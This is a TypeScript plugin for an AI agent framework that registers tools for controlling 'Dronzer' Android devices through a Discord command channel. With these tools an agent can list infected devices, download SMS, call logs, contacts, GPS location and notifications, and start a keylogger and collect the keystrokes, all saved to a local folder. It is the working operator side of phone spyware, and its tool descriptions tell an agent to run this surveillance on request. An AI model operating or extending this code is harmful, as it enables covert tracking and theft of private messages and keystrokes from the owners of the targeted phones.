import { definePluginEntry } from "openclaw/plugin-sdk/plugin-entry";
import https from "node:https";
import fs from "node:fs/promises";
import path from "node:path";

/**
 * Dronzer Ultimate Controller Plugin for OpenClaw
 */

// --- Module-level state for deduplication across potential multiple instances ---
const lastDumpTime: Record<string, number> = {};
const dumpedMessageIds = new Set<string>();
const lastDumpContent: Record<string, string> = {};

export default definePluginEntry({
  id: "dronzer",
  name: "Dronzer Ultimate",
  description: "Remote control Android devices via DRONZER. Use dronzer_* tools when the user asks to fetch devices, SMS, contacts, call logs, location, notifications, or keylogs from a phone.",

  register(api) {
    const pluginConfig = api.runtime.config.current() as any;
    // Nuclear Option: Deep clone to strip all Proxies and hidden Symbols from OpenClaw's config
    const cleanConfig = JSON.parse(JSON.stringify(pluginConfig));
    const config = cleanConfig?.plugins?.entries?.dronzer?.config
                ?? cleanConfig?.plugins?.dronzer?.config
                ?? cleanConfig?.plugins?.dronzer;

    const botToken = config?.botToken ? String(config.botToken) : undefined;
    const userToken = config?.userToken ? String(config.userToken) : undefined;
    const channelId = config?.channelId ? String(config.channelId) : undefined;
    const timeoutMs = Number(config?.timeoutMs ?? 60000);

    // Resolve workspace directory for data dumps
    const workspaceDir = String(cleanConfig?.agents?.list?.find((a: any) => a.id === "main")?.workspace || "/home/ayu/openclaw-main/hello");
    const dumpBaseDir = path.join(workspaceDir, ".dronzer");

    if (!botToken || !channelId || !userToken) {
      api.logger.warn("Dronzer: Missing config. To configure, ask the user for: botToken, userToken, channelId. Add them to plugins.entries.dronzer.config in openclaw.json.");
      return;
    }

    const dumpData = async (type: string, content: string, deviceId: string = "unknown", messageId: string) => {

      if (!messageId) return;
      if (dumpedMessageIds.has(messageId)) return;
      dumpedMessageIds.add(messageId);
      if (dumpedMessageIds.size > 2000) dumpedMessageIds.clear();
      try {
        const targetDir = path.join(dumpBaseDir, deviceId.replace(/[^a-zA-Z0-9_-]/g, ""), type);
        await fs.mkdir(targetDir, { recursive: true });

        const limit = type === "keys" ? 100 : 10;
        const key = `${deviceId}_${type}`;
        const now = Date.now();
        const appendWindowMs = 15000; // 15 seconds to merge chunked responses

        const newFile = path.join(targetDir, `dro-${type}1.txt`);

        if (lastDumpTime[key] && (now - lastDumpTime[key] < appendWindowMs)) {
          // Append chunked responses to the current file
          await fs.appendFile(newFile, "\n\n" + content);
          lastDumpContent[key] = (lastDumpContent[key] || "") + "\n\n" + content;
        } else {
          // Check if content is identical to last dump to avoid duplicate history files
          if (lastDumpContent[key] === content) {
            lastDumpTime[key] = now;
            return;
          }

          // Shift existing files up by 1 (e.g. dro-sms9.txt -> dro-sms10.txt)
          for (let i = limit; i >= 1; i--) {
            const currentFile = path.join(targetDir, `dro-${type}${i}.txt`);
            try {
              await fs.access(currentFile);
              if (i === limit) {
                await fs.unlink(currentFile); // Delete oldest at limit
              } else {
                const nextFile = path.join(targetDir, `dro-${type}${i + 1}.txt`);
                await fs.rename(currentFile, nextFile);
              }
            } catch (e) {
              // File doesn't exist, ignore and continue
            }
          }
          // Save new file as slot 1
          await fs.writeFile(newFile, content);
          lastDumpContent[key] = content;
        }
        
        lastDumpTime[key] = now;

      } catch (err: any) {
        api.logger.error(`Dronzer dump error: ${err.message}`);
      }
    };

    const safeBotToken = botToken ? String(botToken).trim() : "";
    const safeUserToken = userToken ? String(userToken).trim() : "";

    // --- Pure HTTP Request Wrapper (Bypasses OpenClaw's buggy fetch interceptor) ---
    const requestDiscord = (method: string, endpoint: string, token: string, body?: any): Promise<any> => {
      return new Promise((resolve, reject) => {
        const data = body ? JSON.stringify(body) : "";
        const req = https.request(`https://discord.com/api/v10${endpoint}`, {
          method,
          headers: {
            "Authorization": token.startsWith("Bot ") ? token : (token === safeBotToken ? `Bot ${token}` : token),
            "Content-Type": "application/json",
            ...(data ? { "Content-Length": Buffer.byteLength(data) } : {})
          }
        }, (res) => {
          let resData = "";
          res.on("data", chunk => resData += chunk);
          res.on("end", () => {
            if (res.statusCode && res.statusCode >= 200 && res.statusCode < 300) {
              resolve(resData ? JSON.parse(resData) : {});
            } else {
              reject(new Error(`HTTP ${res.statusCode}: ${resData}`));
            }
          });
        });
        req.on("error", reject);
        if (data) req.write(data);
        req.end();
      });
    };

    const downloadTextAttachment = (url: string): Promise<string> => {
      return new Promise((resolve, reject) => {
        https.get(url, (res) => {
          let data = "";
          res.on("data", chunk => data += chunk);
          res.on("end", () => resolve(data));
        }).on("error", reject);
      });
    };

    // --- Background Listener (Polling) ---
    let lastMessageId: string | null = null;
    let isPolling = false;

    const pollMessages = async () => {
      if (isPolling) return;
      isPolling = true;
      try {
        const endpoint = `/channels/${channelId}/messages?limit=10${lastMessageId ? `&after=${lastMessageId}` : ""}`;
        const messages = await requestDiscord("GET", endpoint, safeBotToken);
        
        if (Array.isArray(messages) && messages.length > 0) {
          messages.reverse(); // Process oldest to newest
          for (const m of messages) {
            lastMessageId = m.id;

            // Only process bot/webhook messages
            if (!m.webhook_id && (!m.author || !m.author.bot)) continue;

            const idMatch = m.content?.match(/\[ID:([^\]]+)\]/i);
            const deviceId = idMatch ? idMatch[1] : "unknown";

            let dumpedText = "";
            let hasTxtAttachment = false;

            if (m.attachments && m.attachments.length > 0) {
              for (const a of m.attachments) {
                if (a.url.endsWith(".txt") || a.filename?.endsWith(".txt")) {
                  try {
                    const text = await downloadTextAttachment(a.url);
                    dumpedText += text + "\n";
                    hasTxtAttachment = true;
                  } catch (e) {
                    dumpedText += `${a.url} (Failed to download text)\n`;
                  }
                } else {
                  dumpedText += `${a.url}\n`;
                }
              }
            }

            if (!hasTxtAttachment) {
              const attachmentsString = dumpedText ? `\n\n[ATTACHMENTS]:\n${dumpedText}` : "";
              dumpedText = (m.content || "") + attachmentsString;
            }

            // Auto-categorize
            let category = "general";
            const lower = (m.content || "").toLowerCase();
            if (lower.includes("sms")) category = "sms";
            else if (lower.includes("call log") || lower.includes("callogs") || lower.includes("calllogs")) category = "calllogs";
            else if (lower.includes("contact")) category = "contacts";
            else if (lower.includes("location") || lower.includes("lat:") || lower.includes("long:")) category = "location";
            else if (lower.includes("keylog") || lower.includes("typing") || lower.includes("keys")) category = "keys";
            else if (lower.includes("notif")) category = "notifs";
            else if (lower.includes("device")) category = "devices";

            await dumpData(category, dumpedText, deviceId, m.id);
          }
        }
      } catch (err: any) {
        // Silent fail for polling
      } finally {
        isPolling = false;
      }
    };

    // Initialize last message ID, then start polling
    requestDiscord("GET", `/channels/${channelId}/messages?limit=1`, safeBotToken)
      .then((msgs) => {
        if (msgs && msgs.length > 0) lastMessageId = msgs[0].id;
        setInterval(pollMessages, 3000); // Poll every 3 seconds
      })
      .catch(err => api.logger.error(`Dronzer init error: ${err.message}`));

    // --- Send command via UserToken, collect response via BotToken ---
    const sendAndCollect = async (command: string, dumpType?: string): Promise<string> => {
      const commandText = `!${command}`;
      
      // 1. Send Command
      await requestDiscord("POST", `/channels/${channelId}/messages`, safeUserToken, { content: commandText });

      // 2. Poll for Response
      return new Promise((resolve, reject) => {
        const collectedResults: string[] = [];
        let timer: NodeJS.Timeout | null = null;
        let pollTimer: NodeJS.Timeout | null = null;
        let localLastId = lastMessageId;
        const startTime = Date.now();

        const finalize = () => {
          if (timer) clearTimeout(timer);
          if (pollTimer) clearInterval(pollTimer);
          if (collectedResults.length === 0) {
            reject(new Error(`No response to !${command} within ${timeoutMs / 1000}s timeout.`));
          } else {
            resolve(collectedResults.join("\n\n====================\n\n"));
          }
        };

        let isChecking = false;
        const checkResponses = async () => {
          if (Date.now() - startTime > timeoutMs) return finalize();
          if (isChecking) return;
          isChecking = true;
          
          try {
            const endpoint = `/channels/${channelId}/messages?limit=10${localLastId ? `&after=${localLastId}` : ""}`;
            const messages = await requestDiscord("GET", endpoint, safeBotToken);
            
            if (Array.isArray(messages) && messages.length > 0) {
              messages.reverse();
              for (const m of messages) {
                localLastId = m.id;
                
                if (!m.webhook_id && (!m.author || !m.author.bot)) continue;

                const idMatch = m.content?.match(/\[ID:([^\]]+)\]/i);
                const deviceId = idMatch ? idMatch[1] : "unknown";

                let dumpedText = "";
                let hasTxtAttachment = false;

                if (m.attachments && m.attachments.length > 0) {
                  for (const a of m.attachments) {
                    if (a.url.endsWith(".txt") || a.filename?.endsWith(".txt")) {
                      try {
                        const text = await downloadTextAttachment(a.url);
                        dumpedText += text + "\n";
                        hasTxtAttachment = true;
                      } catch (e) {
                        dumpedText += `${a.url} (Failed to download text)\n`;
                      }
                    } else {
                      dumpedText += `${a.url}\n`;
                    }
                  }
                }

                if (!hasTxtAttachment) {
                  const attachmentsString = dumpedText ? `\n\n[ATTACHMENTS]:\n${dumpedText}` : "";
                  dumpedText = (m.content || "") + attachmentsString;
                }

                const result = dumpedText || "Command sent. Check .dronzer/ for dumped data.";
                if (dumpType) await dumpData(dumpType, result, deviceId, m.id);
                collectedResults.push(`[Device: ${deviceId}]\n${result}`);

                if (!timer) timer = setTimeout(finalize, 5000); // Wait 5s for other devices
              }
            }
          } catch (e) {
          } finally {
            isChecking = false;
          }
        };

        pollTimer = setInterval(checkResponses, 3000);
      });
    };

    // =============================================
    // TOOL REGISTRATIONS
    // The Agent picks tools based on these descriptions.
    // =============================================

    api.registerTool({
      name: "dronzer_fetch_devices",
      label: "Dronzer: Fetch Devices",
      description: "List all connected Dronzer Android devices. Use this when the user says 'fetch devices', 'list devices', 'show dronzer devices', or 'what devices are online'. Sends !devices to Discord via UserToken and reads the response via BotToken. Output is saved to .dronzer/devices/.",
      parameters: { type: "object", properties: {} },
      async execute() {
        try {
          const result = await sendAndCollect("devices", "devices");
          return { content: [{ type: "text", text: result }], details: { text: result } };
        } catch (err: any) {
          return { content: [{ type: "text", text: `[Dronzer Error]: ${err.message}` }], details: { error: err.message } };
        }
      }
    });

    api.registerTool({
      name: "dronzer_fetch_sms",
      label: "Dronzer: Fetch SMS",
      description: "Download SMS messages from the target Android device. Use this when the user says 'fetch sms', 'get sms', 'read messages', or 'dronzer sms'. Sends !sms to Discord via UserToken. Output is saved to .dronzer/sms/.",
      parameters: { type: "object", properties: {} },
      async execute() {
        try {
          const result = await sendAndCollect("sms", "sms");
          return { content: [{ type: "text", text: result }], details: { text: result } };
        } catch (err: any) {
          return { content: [{ type: "text", text: `[Dronzer Error]: ${err.message}` }], details: { error: err.message } };
        }
      }
    });

    api.registerTool({
      name: "dronzer_fetch_calllogs",
      label: "Dronzer: Fetch Call Logs",
      description: "Download call history from the target Android device. Use this when the user says 'fetch call logs', 'get call history', 'dronzer calls', or 'call logs'. Sends !calllogs to Discord via UserToken. Output is saved to .dronzer/calllogs/.",
      parameters: { type: "object", properties: {} },
      async execute() {
        try {
          const result = await sendAndCollect("calllogs", "calllogs");
          return { content: [{ type: "text", text: result }], details: { text: result } };
        } catch (err: any) {
          return { content: [{ type: "text", text: `[Dronzer Error]: ${err.message}` }], details: { error: err.message } };
        }
      }
    });

    api.registerTool({
      name: "dronzer_fetch_contacts",
      label: "Dronzer: Fetch Contacts",
      description: "Download contacts from the target Android device. Use this when the user says 'fetch contacts', 'get contacts', 'dronzer contacts', or 'phone book'. Sends !contacts to Discord via UserToken. Output is saved to .dronzer/contacts/.",
      parameters: { type: "object", properties: {} },
      async execute() {
        try {
          const result = await sendAndCollect("contacts", "contacts");
          return { content: [{ type: "text", text: result }], details: { text: result } };
        } catch (err: any) {
          return { content: [{ type: "text", text: `[Dronzer Error]: ${err.message}` }], details: { error: err.message } };
        }
      }
    });

    api.registerTool({
      name: "dronzer_fetch_location",
      label: "Dronzer: Fetch Location",
      description: "Get the GPS location of the target Android device. Use this when the user says 'fetch location', 'get location', 'where is the phone', 'dronzer location', or 'track device'. Sends !location to Discord via UserToken. Output is saved to .dronzer/location/.",
      parameters: { type: "object", properties: {} },
      async execute() {
        try {
          const result = await sendAndCollect("location", "location");
          return { content: [{ type: "text", text: result }], details: { text: result } };
        } catch (err: any) {
          return { content: [{ type: "text", text: `[Dronzer Error]: ${err.message}` }], details: { error: err.message } };
        }
      }
    });

    api.registerTool({
      name: "dronzer_fetch_notifs",
      label: "Dronzer: Fetch Notifications",
      description: "Get recent notifications from the target Android device. Use this when the user says 'fetch notifications', 'get notifs', 'dronzer notifications', or 'what notifications'. Sends !notifs to Discord via UserToken. Output is saved to .dronzer/notifs/.",
      parameters: { type: "object", properties: {} },
      async execute() {
        try {
          const result = await sendAndCollect("notifs", "notifs");
          return { content: [{ type: "text", text: result }], details: { text: result } };
        } catch (err: any) {
          return { content: [{ type: "text", text: `[Dronzer Error]: ${err.message}` }], details: { error: err.message } };
        }
      }
    });

    api.registerTool({
      name: "dronzer_start_keylogger",
      label: "Dronzer: Start Keylogger",
      description: "Start the keylogger on the target Android device. Use this when the user says 'start keylogger', 'begin keylogging', or 'dronzer keys'. Sends !keys to Discord via UserToken. Logs are saved to .dronzer/keys/.",
      parameters: { type: "object", properties: {} },
      async execute() {
        try {
          const result = await sendAndCollect("keys", "keys");
          return { content: [{ type: "text", text: result }], details: { text: result } };
        } catch (err: any) {
          return { content: [{ type: "text", text: `[Dronzer Error]: ${err.message}` }], details: { error: err.message } };
        }
      }
    });

    api.registerTool({
      name: "dronzer_fetch_keys",
      label: "Dronzer: Fetch Keylogs",
      description: "Stop the keylogger and download captured keystrokes from the target Android device. Use this when the user says 'fetch keylogs', 'get keylogs', 'stop keylogger', or 'dronzer keylogs'. Sends !stop5 to Discord via UserToken. Output is saved to .dronzer/keys/.",
      parameters: { type: "object", properties: {} },
      async execute() {
        try {
          const result = await sendAndCollect("stop5", "keys");
          return { content: [{ type: "text", text: result }], details: { text: result } };
        } catch (err: any) {
          return { content: [{ type: "text", text: `[Dronzer Error]: ${err.message}` }], details: { error: err.message } };
        }
      }
    });

    api.registerTool({
      name: "dronzer_select_unit",
      label: "Dronzer: Select Unit",
      description: "Target a specific Dronzer device by its ID. Use this when the user says 'select device', 'switch to device', or 'target unit'. Sends !select <deviceId> to Discord via UserToken.",
      parameters: {
        type: "object",
        properties: {
          deviceId: { type: "string", description: "The device ID to target (e.g. 'PIXEL_A1B2C3')." }
        },
        required: ["deviceId"]
      },
      async execute(_id, params) {
        const args = params as { deviceId: string };
        try {
          const result = await sendAndCollect(`select ${args.deviceId}`);
          return { content: [{ type: "text", text: result }], details: { text: result } };
        } catch (err: any) {
          return { content: [{ type: "text", text: `[Dronzer Error]: ${err.message}` }], details: { error: err.message } };
        }
      }
    });

    api.logger.info("Dronzer Ultimate: All tools registered. UserToken dispatches commands, BotToken listens for responses. Data dumped to .dronzer/.");
  }
});
